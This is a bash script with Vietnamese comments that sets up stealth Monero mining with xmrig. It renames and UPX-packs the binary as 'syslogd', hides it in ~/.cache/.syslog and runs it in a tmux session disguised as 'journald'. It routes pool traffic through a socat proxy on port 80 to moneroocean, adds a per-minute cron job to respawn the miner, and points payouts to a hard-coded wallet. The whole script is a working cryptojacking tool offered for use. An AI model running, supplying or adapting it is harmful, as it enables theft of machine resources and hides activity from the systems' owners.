#!/bin/bash

# ==== Cấu hình chung ====
POOL_REAL="ulf.moneroocean.stream:443"
POOL_LOCAL="127.0.0.1:80"
WALLET="84UznXHBqkhUcsDt7uJGLgMcfZSSfWbkyLgNPoX5TAKk63p9WNwZacNAto4qUJSz1b3pikEWcRwrZ5ZfsSD5iZSK4aHmY6Z"       # 👈 ĐỔI ví tại đây
CPU_PERCENT=90
INSTALL_DIR="$HOME/.cache/.syslog"
RIG_NAME=$(hostname)
PROCESS_NAME="syslogd"                 # 👈 Tên tiến trình ngụy trang
SESSION_NAME="journald"                # 👈 Tên tmux session ngụy trang

# ==== Chuẩn bị ====
sudo apt update -y
sudo apt install -y curl tar upx-ucl tmux socat cpulimit >/dev/null

# ==== Tạo thư mục ẩn ====
mkdir -p "$INSTALL_DIR"
cd "$INSTALL_DIR" || exit 1

# ==== Tải xmrig không tên ====
curl -L -o sys.tar.gz "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz"
tar -xvzf sys.tar.gz --strip=1 >/dev/null
rm -f sys.tar.gz

# ==== Đổi tên file, ẩn danh hoàn toàn ====
mv xmrig "$PROCESS_NAME"
chmod +x "$PROCESS_NAME"
upx --best --lzma "$PROCESS_NAME" >/dev/null 2>&1

# ==== Tạo file config ẩn danh ====
cat > .cfg.json <<EOF
{
  "autosave": true,
  "cpu": true,
  "background": true,
  "pools": [
    {
      "url": "$POOL_LOCAL",
      "user": "$WALLET",
      "pass": "$RIG_NAME",
      "tls": true,
      "keepalive": true
    }
  ]
}
EOF

# ==== Tạo proxy từ port 80 sang pool TLS ====
tmux has-session -t proxy 2>/dev/null || tmux new-session -d -s proxy "sudo socat TCP-LISTEN:80,reuseaddr,fork TCP:$POOL_REAL"

# ==== Chạy tiến trình ngụy trang, hạn chế CPU ====
tmux has-session -t "$SESSION_NAME" 2>/dev/null || tmux new-session -d -s "$SESSION_NAME" "cpulimit -l $CPU_PERCENT -- ./syslogd -c .cfg.json"

# ==== Cron tự khôi phục nếu die ====
(crontab -l 2>/dev/null; echo "* * * * * pgrep -f $PROCESS_NAME > /dev/null || (cd $INSTALL_DIR && tmux new-session -d -s $SESSION_NAME 'cpulimit -l $CPU_PERCENT -- ./$PROCESS_NAME -c .cfg.json')") | crontab -

# ==== Kết thúc ====
echo "✅ Đào XMR stealth hoàn tất"
echo "📁 Tệp tin, tiến trình, session: ẩn dưới tên '$PROCESS_NAME', '$SESSION_NAME'"
echo "🧠 Đang chạy tại: $INSTALL_DIR"
